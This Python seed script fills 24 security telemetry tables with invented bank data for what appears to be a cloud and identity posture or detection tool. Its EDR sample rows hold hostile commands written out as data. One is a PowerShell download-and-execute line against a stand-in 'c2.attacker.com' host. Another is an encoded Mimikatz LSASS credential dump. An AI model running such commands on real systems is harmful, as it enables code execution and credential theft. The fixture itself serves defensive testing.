import os
import json
import logging
from datetime import datetime, timedelta
import random
from .sql_server_conn import SqlServerConnector

logger = logging.getLogger(__name__)

def seed_enterprise_bank_sample_data(sql_conn: SqlServerConnector, force_reload: bool = False) -> dict:
    """Generates realistic enterprise bank data across all 24 multi-plane telemetry tables."""
    try:
        # Check existing count in one of the tables
        check_tbl = sql_conn.fetch_one("SELECT COUNT(*) AS cnt FROM aws_security_groups")
        if check_tbl and check_tbl.get("cnt", 0) > 0 and not force_reload:
            logger.info("Multi-plane telemetry tables already populated. Skipping bank sample data seed.")
            return {"status": "skipped", "message": "Already populated"}

        logger.info("Seeding realistic Enterprise Bank sample data across 24 multi-plane tables...")

        # Helper for execution
        def exec_many(table_name, insert_sql, params_list):
            if force_reload:
                sql_conn.execute_non_query(f"TRUNCATE TABLE [{table_name}]")
            with sql_conn.get_connection() as conn:
                cursor = conn.cursor()
                cursor.executemany(insert_sql, params_list)
                conn.commit()

        now = datetime.utcnow()
        now_str = now.isoformat()

        # 1. aws_iam_policies
        aws_iam_data = [
            ("pol-bank-admin-001", "AdministratorAccessPolicy", "User", "admin-john", 1, json.dumps({"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}), now_str),
            ("pol-bank-s3-002", "S3FullAccessCustomerData", "Role", "Role-S3-Export", 1, json.dumps({"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "s3:*", "Resource": "*"}]}), now_str),
            ("pol-bank-ec2-003", "EC2ReadOnlyProd", "Group", "DevOps-Group", 1, json.dumps({"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "ec2:Describe*", "Resource": "*"}]}), now_str),
            ("pol-bank-iam-004", "IAMPassRoleWildcard", "User", "service-deployer", 1, json.dumps({"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "iam:PassRole", "Resource": "*"}]}), now_str),
            ("pol-bank-sec-005", "HardenedSecurityAudit", "Role", "SecOps-Role", 1, json.dumps({"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "cloudwatch:Get*", "Resource": "arn:aws:cloudwatch:us-east-1:123456789012:log-group:*"}]}), now_str)
        ]
        exec_many("aws_iam_policies", "INSERT INTO aws_iam_policies (policy_id, policy_name, entity_type, entity_name, is_attached, document_json, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)", aws_iam_data)

        # 2. aws_security_groups
        aws_sg_data = [
            ("sg-bank-web-01", "vpc-core-01", "Public-Web-SG", "ingress", "tcp", 80, 443, "0.0.0.0/0", "::/0", json.dumps({"rule": "allow_web"})),
            ("sg-bank-ssh-open-02", "vpc-core-01", "Rogue-SSH-Management", "ingress", "tcp", 22, 22, "0.0.0.0/0", None, json.dumps({"rule": "open_ssh_danger"})),
            ("sg-bank-rdp-open-03", "vpc-core-02", "Legacy-RDP-Access", "ingress", "tcp", 3389, 3389, "0.0.0.0/0", None, json.dumps({"rule": "open_rdp_danger"})),
            ("sg-bank-db-04", "vpc-core-02", "Internal-Database-SG", "ingress", "tcp", 1433, 1433, "10.100.0.0/16", None, json.dumps({"rule": "internal_mssql"})),
            ("sg-bank-bastion-05", "vpc-core-01", "PAM-Bastion-Host", "ingress", "tcp", 22, 22, "10.200.1.50/32", None, json.dumps({"rule": "bastion_only"}))
        ]
        exec_many("aws_security_groups", "INSERT INTO aws_security_groups (group_id, vpc_id, group_name, direction, protocol, from_port, to_port, cidr_ipv4, cidr_ipv6, rule_json) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", aws_sg_data)

        # 3. aws_cloudtrail_configs
        aws_ct_data = [
            ("arn:aws:cloudtrail:us-east-1:123456789012:trail/BankGlobalTrail", "BankGlobalTrail", "s3-bank-audit-logs-global", 1, 1, "arn:aws:kms:us-east-1:1234:key/kms-1", 1, json.dumps({"multi_region": True})),
            ("arn:aws:cloudtrail:us-west-2:123456789012:trail/LocalRegionTrail", "LocalRegionTrail", "s3-bank-local-logs", 0, 0, None, 1, json.dumps({"multi_region": False, "log_validation": False})),
            ("arn:aws:cloudtrail:eu-west-1:123456789012:trail/DisabledTrail", "DisabledTrail", "s3-bank-eu-logs", 0, 0, None, 0, json.dumps({"is_logging": False}))
        ]
        exec_many("aws_cloudtrail_configs", "INSERT INTO aws_cloudtrail_configs (trail_arn, trail_name, s3_bucket, is_multi_region, log_validation_enabled, kms_key_id, is_logging, config_json) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", aws_ct_data)

        # 4. azure_rbac_assignments
        azure_rbac_data = [
            ("assign-sub-owner-01", "princ-guest-99", "User", "external.vendor@gmail.com", "Owner", "/subscriptions/sub-bank-prod-01", "sub-bank-prod-01", 1),
            ("assign-sub-contrib-02", "princ-user-12", "User", "sarah.connor@scb.com", "Contributor", "/subscriptions/sub-bank-prod-01", "sub-bank-prod-01", 0),
            ("assign-sub-reader-03", "princ-user-44", "User", "alex.smith@scb.com", "Reader", "/subscriptions/sub-bank-dev-02", "sub-bank-dev-02", 0),
            ("assign-sub-guest-04", "princ-guest-101", "Guest", "hacker.temp@external.com", "Contributor", "/subscriptions/sub-bank-prod-02", "sub-bank-prod-02", 1)
        ]
        exec_many("azure_rbac_assignments", "INSERT INTO azure_rbac_assignments (assignment_id, principal_id, principal_type, principal_name, role_name, scope, subscription_id, is_guest) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", azure_rbac_data)

        # 5. azure_nsg_rules
        azure_nsg_data = [
            ("nsg-rule-open-ssh", "nsg-prod-subnet-01", "NSG-Subnet-Prod", 100, "Inbound", "Allow", "0.0.0.0/0", "22", "TCP", json.dumps({"rule": "open_ssh"})),
            ("nsg-rule-open-rdp", "nsg-prod-subnet-02", "NSG-Subnet-App", 110, "Inbound", "Allow", "0.0.0.0/0", "3389", "TCP", json.dumps({"rule": "open_rdp"})),
            ("nsg-rule-allow-web", "nsg-web-01", "NSG-DMZ-Web", 200, "Inbound", "Allow", "Internet", "443", "TCP", json.dumps({"rule": "allow_https"})),
            ("nsg-rule-internal", "nsg-db-01", "NSG-Database-Internal", 300, "Inbound", "Allow", "VirtualNetwork", "1433", "TCP", json.dumps({"rule": "internal_sql"}))
        ]
        exec_many("azure_nsg_rules", "INSERT INTO azure_nsg_rules (rule_id, nsg_id, nsg_name, priority, direction, access, source_prefix, dest_port_range, protocol, raw_rule) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", azure_nsg_data)

        # 6. azure_diagnostic_settings
        azure_diag_data = [
            ("diag-setting-sub01", "/subscriptions/sub-bank-prod-01", "ws-log-analytics-prod", "stbankauditlogs", json.dumps(["Administrative", "Security", "Policy"]), 1),
            ("diag-setting-disabled", "/subscriptions/sub-bank-dev-02", None, None, json.dumps([]), 0)
        ]
        exec_many("azure_diagnostic_settings", "INSERT INTO azure_diagnostic_settings (setting_id, resource_id, workspace_id, storage_account, log_categories, alerts_enabled) VALUES (?, ?, ?, ?, ?, ?)", azure_diag_data)

        # 7. gcp_iam_bindings
        gcp_iam_data = [
            ("bind-gcp-owner-01", "proj-bank-core-prod", "roles/owner", "user", "external.consultant@gmail.com", None, "etag-101"),
            ("bind-gcp-editor-02", "proj-bank-core-prod", "roles/editor", "user", "developer.mike@scb.com", None, "etag-102"),
            ("bind-gcp-sec-03", "proj-bank-core-prod", "roles/viewer", "group", "secops-team@scb.com", None, "etag-103")
        ]
        exec_many("gcp_iam_bindings", "INSERT INTO gcp_iam_bindings (binding_id, project_id, role, member_type, member_email, condition, policy_etag) VALUES (?, ?, ?, ?, ?, ?, ?)", gcp_iam_data)

        # 8. gcp_firewall_rules
        gcp_fw_data = [
            ("fw-gcp-open-ssh", "proj-bank-core-prod", "allow-ssh-all", "INGRESS", "ALLOW", 1000, json.dumps(["0.0.0.0/0"]), json.dumps(["tcp:22"]), 0),
            ("fw-gcp-open-rdp", "proj-bank-core-prod", "allow-rdp-all", "INGRESS", "ALLOW", 1000, json.dumps(["0.0.0.0/0"]), json.dumps(["tcp:3389"]), 0),
            ("fw-gcp-web", "proj-bank-core-prod", "allow-https", "INGRESS", "ALLOW", 100, json.dumps(["0.0.0.0/0"]), json.dumps(["tcp:443"]), 0)
        ]
        exec_many("gcp_firewall_rules", "INSERT INTO gcp_firewall_rules (rule_id, project_id, rule_name, direction, action, priority, source_ranges, allowed_ports, is_disabled) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)", gcp_fw_data)

        # 9. gcp_logging_sinks
        gcp_sink_data = [
            ("sink-bigquery-audit", "proj-bank-core-prod", "bigquery.googleapis.com/projects/proj-bank-core-prod/datasets/audit_logs", "resource.type=gce_instance", "serviceAccount:sink-sa@scb.iam.gserviceaccount.com", 0),
            ("sink-disabled-storage", "proj-bank-core-prod", "storage.googleapis.com/bank-audit-bucket", "resource.type=all", "serviceAccount:sink-sa2@scb.iam.gserviceaccount.com", 1)
        ]
        exec_many("gcp_logging_sinks", "INSERT INTO gcp_logging_sinks (sink_name, project_id, destination, filter_text, writer_identity, is_disabled) VALUES (?, ?, ?, ?, ?, ?)", gcp_sink_data)

        # 10. vault_server_configs
        vault_cfg_data = [
            ("cfg-vault-prod-01", "vault-prod-node01.scb.com", 0, 0, "raft", "10.100.4.10:8200", "tls_disable = 0\ndisable_mlock = false"),
            ("cfg-vault-dev-unsecured", "vault-dev-node02.scb.com", 1, 1, "file", "10.100.4.11:8200", "tls_disable = 1\ndisable_mlock = true")
        ]
        exec_many("vault_server_configs", "INSERT INTO vault_server_configs (config_id, hostname, tls_disable, disable_mlock, storage_type, listener_address, config_raw) VALUES (?, ?, ?, ?, ?, ?, ?)", vault_cfg_data)

        # 11. vault_acl_policies
        vault_policy_data = [
            ("policy-wildcard-sudo", "secret/data/*", json.dumps(["create", "read", "update", "delete", "sudo"]), json.dumps(["*"]), "path \"secret/data/*\" { capabilities = [\"create\", \"read\", \"update\", \"delete\", \"sudo\"] }"),
            ("policy-read-only", "secret/data/finance/*", json.dumps(["read", "list"]), json.dumps([]), "path \"secret/data/finance/*\" { capabilities = [\"read\", \"list\"] }")
        ]
        exec_many("vault_acl_policies", "INSERT INTO vault_acl_policies (policy_name, path_pattern, capabilities, allowed_parameters, raw_hcl) VALUES (?, ?, ?, ?, ?)", vault_policy_data)

        # 12. vault_audit_devices
        vault_audit_data = [
            ("file/", "file", "Local Vault File Audit Device", json.dumps({"file_path": "/var/log/vault/audit.log"}), 1),
            ("syslog/", "syslog", "Remote Syslog Audit Device", json.dumps({"tag": "vault"}), 1),
            ("socket_disabled/", "socket", "Disabled Socket Audit Device", json.dumps({"address": "127.0.0.1:9099"}), 0)
        ]
        exec_many("vault_audit_devices", "INSERT INTO vault_audit_devices (device_path, type, description, options, is_active) VALUES (?, ?, ?, ?, ?)", vault_audit_data)

        # 13. beyondtrust_active_sessions
        bt_session_data = [
            ("sess-bt-unauth-01", "usr-john-99", "root", "srv-db-prod-01.scb.com", "SSH", (now - timedelta(hours=4)).isoformat(), 60, "", "ACTIVE_NO_TICKET"),
            ("sess-bt-auth-02", "usr-sarah-12", "domain_admin", "dc-01.scb.com", "RDP", (now - timedelta(minutes=30)).isoformat(), 120, "INC-982341", "ACTIVE_APPROVED"),
            ("sess-bt-exceeded-03", "usr-mike-44", "aws_admin", "bastion-aws-01", "SSH", (now - timedelta(hours=5)).isoformat(), 120, "CHG-10293", "EXCEEDED_TIMEOUT")
        ]
        exec_many("beyondtrust_active_sessions", "INSERT INTO beyondtrust_active_sessions (session_id, user_id, account_name, target_system, protocol, start_time, max_duration_mins, ticket_number, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)", bt_session_data)

        # 14. sailpoint_identities
        sailpoint_data = [
            ("sp-usr-terminated-admin", "John Doe (Terminated Admin)", "john.doe@scb.com", "Terminated", "Former Cloud Architect", json.dumps(["AWS-Admin", "Domain-Admin"]), (now - timedelta(days=90)).isoformat()),
            ("sp-usr-active-vp", "Sarah Connor", "sarah.connor@scb.com", "Active", "VP Infrastructure", json.dumps(["AWS-Admin", "Azure-Owner"]), (now - timedelta(days=5)).isoformat()),
            ("sp-usr-contractor-expired", "Mike Vance (Contractor)", "mike.vance@external.scb.com", "Terminated", "External Consultant", json.dumps(["Vault-Sudo", "Domain-Admin"]), (now - timedelta(days=60)).isoformat())
        ]
        exec_many("sailpoint_identities", "INSERT INTO sailpoint_identities (identity_id, name, email, lifecycle_state, title, entitlements, last_certification_date) VALUES (?, ?, ?, ?, ?, ?, ?)", sailpoint_data)

        # 15. ad_users
        ad_users_data = [
            ("johndoe", "CN=John Doe,OU=Terminated,DC=scb,DC=com", 1, "2024-01-01T00:00:00", 1, "2026-07-20T10:00:00", json.dumps(["Domain Admins", "Schema Admins"]), 512),
            ("sconnor", "CN=Sarah Connor,OU=Execs,DC=scb,DC=com", 1, "2026-06-01T00:00:00", 0, "2026-07-28T08:00:00", json.dumps(["Domain Admins"]), 512),
            ("staleadmin", "CN=Stale Admin,OU=IT,DC=scb,DC=com", 1, "2022-01-01T00:00:00", 1, "2023-01-01T00:00:00", json.dumps(["Enterprise Admins"]), 66048)
        ]
        exec_many("ad_users", "INSERT INTO ad_users (sam_account_name, dn, enabled, password_last_set, password_never_expires, last_logon_date, member_of, uac_flags) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", ad_users_data)

        # 16. ad_gpo_reports
        ad_gpo_data = [
            ("{GPO-DEFAULT-DOMAIN-POLICY}", "Default Domain Policy", "Enforced", 0, 0, 0, 1, "<GPO><LSA>Disabled</LSA></GPO>"),
            ("{GPO-SECURITY-BASELINE-HARDENED}", "SCB Enterprise Security Baseline GPO", "Enforced", 1, 1, 1, 5, "<GPO><LSA>Enabled</LSA><PS>Audit</PS></GPO>"),
            ("{GPO-WEAK-POWERSHELL}", "Workstation PowerShell Legacy Policy", "Enforced", 0, 0, 0, 0, "<GPO><ScriptBlockLogging>Disabled</ScriptBlockLogging></GPO>")
        ]
        exec_many("ad_gpo_reports", "INSERT INTO ad_gpo_reports (gpo_id, gpo_name, gpo_status, lsa_protection_enabled, ps_transcription_enabled, ps_scriptblock_logging, lm_hash_level, raw_xml) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", ad_gpo_data)

        # 17. entra_role_assignments
        entra_role_data = [
            ("assign-entra-globaladmin-guest", "role-def-ga", "Global Administrator", "princ-guest-99", "external.vendor@gmail.com", "Guest", 1),
            ("assign-entra-globaladmin-user", "role-def-ga", "Global Administrator", "princ-sconnor", "sarah.connor@scb.com", "User", 0),
            ("assign-entra-useradmin", "role-def-ua", "User Administrator", "princ-helpdesk", "helpdesk.tier1@scb.com", "User", 0)
        ]
        exec_many("entra_role_assignments", "INSERT INTO entra_role_assignments (assignment_id, role_definition_id, role_name, principal_id, principal_name, principal_type, is_guest) VALUES (?, ?, ?, ?, ?, ?, ?)", entra_role_data)

        # 18. entra_risk_detections
        entra_risk_data = [
            ("risk-entra-101", now_str, "ImpossibleTravel", "johndoe@scb.com", "Employee", "198.51.100.45", "Moscow, RU", 0, 95.0),
            ("risk-entra-102", now_str, "LeakedCredentials", "external.vendor@gmail.com", "Guest", "203.0.113.88", "Beijing, CN", 0, 90.0),
            ("risk-entra-103", (now - timedelta(days=2)).isoformat(), "AnomalousToken", "alex.smith@scb.com", "Employee", "10.0.4.12", "Singapore, SG", 1, 15.0)
        ]
        exec_many("entra_risk_detections", "INSERT INTO entra_risk_detections (event_id, timestamp, event_type, identity_user, identity_type, source_ip, geo_location, success, risk_score) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)", entra_risk_data)

        # 19. defender_identity_alerts
        mdi_alert_data = [
            ("alert-mdi-dcsync-01", "DCSync attack detected from Host-FIN-DC02", "High", "ActiveDirectorySecurity", "UNRESOLVED", "johndoe", "HOST-FIN-DC02", json.dumps(["T1003.006"])),
            ("alert-mdi-kerberoast-02", "Kerberoasting attempt targeting MSSQL SPNs", "High", "CredentialAccess", "UNRESOLVED", "staleadmin", "HOST-WORKSTATION-88", json.dumps(["T1558.003"])),
            ("alert-mdi-goldenticket-03", "Suspected Golden Ticket Activity", "Critical", "Persistence", "NEW", "krbtgt", "HOST-DC-01", json.dumps(["T1558.001"]))
        ]
        exec_many("defender_identity_alerts", "INSERT INTO defender_identity_alerts (alert_id, title, severity, category, status, impacted_user, impacted_computer, mitre_techniques) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", mdi_alert_data)

        # 20. wiz_issues
        wiz_data = [
            ("wiz-issue-toxic-comb-01", "Publicly Exposed VM with Database Secrets & SSH Key", "CRITICAL", "OPEN", "entity-vm-101", "bank-payment-gateway-vm", "VirtualMachine", json.dumps(["ExposedSecret", "PublicIP", "AdminPrivilege"])),
            ("wiz-issue-open-bucket-02", "S3 Bucket Containing PII Is Publicly Readable", "HIGH", "OPEN", "entity-s3-202", "s3-bank-customer-pii", "S3Bucket", json.dumps(["PublicStorage", "PIIExposure"]))
        ]
        exec_many("wiz_issues", "INSERT INTO wiz_issues (issue_id, title, severity, status, entity_id, entity_name, entity_type, toxic_combination_tags) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", wiz_data)

        # 21. compliance_benchmark_reports
        cis_reports_data = [
            ("rep-cis-001", "BANK-HOST-001", "CIS Microsoft Windows Server 2022 Benchmark", "T1001", "1.1.1 Ensure LSA Protection Is Enabled", "FAIL", 9, "LSA Protection registry key missing"),
            ("rep-cis-002", "BANK-HOST-001", "CIS Microsoft Windows Server 2022 Benchmark", "T1059.001", "1.2.4 Ensure PowerShell Script Block Logging Is Enabled", "FAIL", 8, "Script block logging disabled via GPO"),
            ("rep-cis-003", "BANK-HOST-002", "CIS Microsoft Windows Server 2022 Benchmark", "T1078", "2.1.1 Ensure Password Policy Lockout Threshold Is Set", "PASS", 10, "Lockout threshold set to 5 attempts"),
            ("rep-cis-004", "BANK-HOST-003", "CIS Red Hat Enterprise Linux 9 Benchmark", "T1021", "3.1.2 Ensure SSH Root Login Is Disabled", "FAIL", 9, "PermitRootLogin yes in sshd_config")
        ]
        exec_many("compliance_benchmark_reports", "INSERT INTO compliance_benchmark_reports (report_id, host_id, benchmark_name, rule_id, rule_title, result, impact_score, failed_reason) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", cis_reports_data)

        # 22. edr_process_events
        edr_process_data = [
            ("evt-edr-proc-001", "BANK-WORKSTATION-101", now_str, "cmd.exe", "WINWORD.EXE", "cmd.exe /c powershell -enc aW52b2tl...", "john.doe@scb.com", 1),
            ("evt-edr-proc-002", "BANK-SERVER-404", now_str, "powershell.exe", "w3wp.exe", "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\script.ps1", "NETWORK SERVICE", 1),
            ("evt-edr-proc-003", "BANK-WORKSTATION-202", now_str, "chrome.exe", "explorer.exe", "C:\\Program Files\\Google\\Chrome\\chrome.exe", "sarah.connor@scb.com", 0)
        ]
        exec_many("edr_process_events", "INSERT INTO edr_process_events (event_id, host_name, timestamp, process_name, parent_process, command_line, user_account, is_suspicious) VALUES (?, ?, ?, ?, ?, ?, ?, ?)", edr_process_data)

        # 23. edr_powershell_scriptblocks
        edr_ps_data = [
            ("evt-ps-block-001", "BANK-WORKSTATION-101", now_str, "sb-99231", "powershell -enc aW52b2tlLW1pbWlrYXR6IC1jb21tYW5kICJwcml2aWxlZ2U6OmRlYnVnIiAic2VjdXJsdHNhOjpsc2FzcyI=", "john.doe@scb.com", 1),
            ("evt-ps-block-002", "BANK-SERVER-404", now_str, "sb-99232", "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://c2.attacker.com/payload.ps1')", "NETWORK SERVICE", 1),
            ("evt-ps-block-003", "BANK-WORKSTATION-202", now_str, "sb-10022", "Get-Process | Where-Object {$_.CPU -gt 10}", "sarah.connor@scb.com", 0)
        ]
        exec_many("edr_powershell_scriptblocks", "INSERT INTO edr_powershell_scriptblocks (event_id, host_name, timestamp, script_block_id, script_content, user_account, contains_obfuscation) VALUES (?, ?, ?, ?, ?, ?, ?)", edr_ps_data)

        # 24. edr_registry_file_audits
        edr_audit_data = [
            ("evt-reg-lsass-001", "BANK-WORKSTATION-101", now_str, "lsass_dump.exe", "\\Device\\HarddiskVolume3\\Windows\\System32\\lsass.exe", "PROCESS_VM_READ", "john.doe@scb.com"),
            ("evt-reg-runkey-002", "BANK-WORKSTATION-101", now_str, "malware_installer.exe", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor", "KEY_SET_VALUE", "john.doe@scb.com")
        ]
        exec_many("edr_registry_file_audits", "INSERT INTO edr_registry_file_audits (event_id, host_name, timestamp, process_name, target_object, operation_type, user_account) VALUES (?, ?, ?, ?, ?, ?, ?)", edr_audit_data)

        logger.info("Successfully populated realistic Enterprise Bank sample data across all 24 tables.")
        return {"status": "success", "message": "Enterprise bank data loaded"}

    except Exception as e:
        logger.error(f"Error seeding enterprise bank sample data: {e}")
        return {"status": "error", "message": str(e)}
